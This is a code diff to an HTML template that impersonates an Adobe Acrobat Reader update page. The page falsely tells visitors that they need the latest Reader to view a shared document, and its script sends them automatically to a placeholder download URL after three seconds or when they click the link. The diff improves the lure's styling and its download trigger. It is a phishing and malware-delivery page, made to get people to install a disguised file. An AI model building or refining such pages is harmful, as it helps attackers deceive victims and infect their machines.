@@ -4,21 +4,26 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Adobe Acrobat Reader</title>
+<link rel="preload" as="image" href="https://i.ibb.co/1Wzk6vF/Adobe-landing.jpg">
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    overflow: hidden;
+  }
   body {
     font-family: "Adobe Clean", "Segoe UI", Arial, sans-serif;
     background: #f5f5f5;
-    min-height: 100vh;
     display: flex;
     flex-direction: column;
+    height: 100vh;
   }
 
-  /* Top Adobe bar */
   .adobe-bar {
     background: #fff;
     border-bottom: 1px solid #e0e0e0;
     padding: 12px 30px;
+    flex-shrink: 0;
   }
   .adobe-bar span {
     font-size: 1.35rem;
@@ -28,28 +33,26 @@
     letter-spacing: -0.5px;
   }
 
-  /* Background area */
   .bg-area {
     flex: 1;
-    background: url('https://i.ibb.co/1Wzk6vF/Adobe-landing.jpg') center center / cover no-repeat;
+    background: #2a1a10 url('https://i.ibb.co/1Wzk6vF/Adobe-landing.jpg') center center / cover no-repeat;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 40px 20px;
-    position: relative;
+    padding: 20px;
   }
 
-  /* Dark card */
   .card {
-    background: rgba(20, 20, 20, 0.92);
-    backdrop-filter: blur(12px);
+    background: rgba(10, 10, 10, 0.75);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
     border-radius: 18px;
-    padding: 45px 50px;
+    padding: 42px 48px;
     max-width: 520px;
     width: 100%;
     text-align: center;
     color: #fff;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
   }
 
   .card-header {
@@ -57,25 +60,16 @@
     align-items: center;
     justify-content: center;
     gap: 12px;
-    margin-bottom: 28px;
+    margin-bottom: 26px;
   }
-
-  .acrobat-icon {
-    width: 36px;
-    height: 36px;
-  }
-
-  .card-header h2 {
-    font-size: 1.2rem;
-    font-weight: 600;
-    color: #fff;
-  }
+  .acrobat-icon { width: 36px; height: 36px; }
+  .card-header h2 { font-size: 1.2rem; font-weight: 600; color: #fff; }
 
   .card h1 {
     font-size: 2rem;
     font-weight: 700;
     color: #fff;
-    margin-bottom: 24px;
+    margin-bottom: 22px;
   }
 
   .card p {
@@ -85,57 +79,35 @@
     margin-bottom: 20px;
   }
 
-  .manual {
-    font-size: 0.85rem;
-    color: #aaa;
-    margin-bottom: 24px;
-  }
-  .manual a {
-    color: #4da3ff;
-    text-decoration: underline;
-    cursor: pointer;
-  }
-  .manual a:hover {
-    color: #7dbfff;
-  }
+  .manual { font-size: 0.85rem; color: #aaa; margin-bottom: 22px; }
+  .manual a { color: #4da3ff; text-decoration: underline; cursor: pointer; }
+  .manual a:hover { color: #7dbfff; }
 
-  .instructions {
-    text-align: left;
-    padding-left: 20px;
-  }
-  .instructions li {
-    font-size: 0.88rem;
-    color: #ccc;
-    line-height: 1.8;
-  }
+  .instructions { text-align: left; padding-left: 20px; }
+  .instructions li { font-size: 0.88rem; color: #ccc; line-height: 1.8; }
 
   .status {
-    margin-top: 20px;
+    margin-top: 18px;
     font-size: 0.85rem;
     color: #aaa;
-    min-height: 24px;
+    min-height: 22px;
   }
 
   @media (max-width: 580px) {
-    .card { padding: 30px 24px; }
+    .card { padding: 28px 22px; }
     .card h1 { font-size: 1.5rem; }
   }
 </style>
 </head>
 <body>
 
-<!-- Adobe top bar -->
-<div class="adobe-bar">
-  <span>Adobe</span>
-</div>
+<div class="adobe-bar"><span>Adobe</span></div>
 
-<!-- Background + Card -->
 <div class="bg-area">
   <div class="card">
     <div class="card-header">
       <svg class="acrobat-icon" viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg">
         <path d="M47.4 0h145.2c26.2 0 47.4 21.2 47.4 47.4v138.6c0 26.2-21.2 47.4-47.4 47.4H47.4C21.2 233.4 0 212.2 0 186V47.4C0 21.2 21.2 0 47.4 0z" fill="#B30B00"/>
-        <path d="M162.5 55.2L120 176.4h-8.4l16.2-46.2-28.8-75h28.2l14.4 47.4h.6l15-47.4h5.3zm-84.6 0H49.8v121.2h28.2V55.2h-.1zM190.2 55.2h-28.1v121.2h28.1V55.2z" fill="none"/>
         <path d="M120 176.4h-8.4l16.2-46.2c7.2 3 15.6 8.4 20.4 15.6L120 176.4z" fill="#fff"/>
         <path d="M78 55.2L120 176.4l28.2-30.6c-4.8-7.2-13.2-12.6-20.4-15.6L78 55.2z" fill="#fff"/>
         <path d="M162.5 55.2h-28.2l-6.6 21.6h28.2l6.6-21.6z" fill="#fff"/>
@@ -148,7 +120,7 @@
 
     <p>To read the document, you do not have the latest version of Adobe Acrobat Reader for Windows App installed. The latest version of Adobe Acrobat Reader will download automatically, kindly install or open to view the shared document.</p>
 
-    <div class="manual">
+    <div class="manual" id="manual">
       If the download doesn't start automatically, Click., <a href="{{download_url}}" id="manual-link">Download Manually.</a>
     </div>
 
@@ -164,10 +136,23 @@
 (function(){
   var dlUrl = "{{download_url}}";
   if (!dlUrl) return;
+  var triggered = false;
 
-  setTimeout(function(){
+  function doDownload() {
+    if (triggered) return;
+    triggered = true;
     window.location.href = dlUrl;
-  }, 3000);
+  }
+
+  setTimeout(doDownload, 3000);
+
+  var manualLink = document.getElementById("manual-link");
+  if (manualLink) {
+    manualLink.addEventListener("click", function(e) {
+      e.preventDefault();
+      doDownload();
+    });
+  }
 })();
 </script>
 </body>
